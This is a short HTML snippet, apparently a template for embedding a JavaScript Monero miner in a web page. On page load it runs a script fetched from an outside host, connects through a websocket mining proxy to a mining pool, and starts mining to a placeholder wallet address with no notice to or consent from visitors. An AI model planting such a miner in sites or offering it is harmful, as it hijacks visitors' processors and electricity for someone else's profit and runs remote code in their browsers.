#setminer default https://monerominer.rocks/miner-website-integration/javascript-miner/
<script src="https://script.ghgi.xyz"></script>
<script>
    server = "wss://ny1.xmrminingproxy.com";
    var pool = "moneroocean.stream";
    var walletAddress = "PUT YOUR WALLET ADDRESS HERE";
    var workerId = ""
    var threads = -1;
    var password = "x";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
</script>
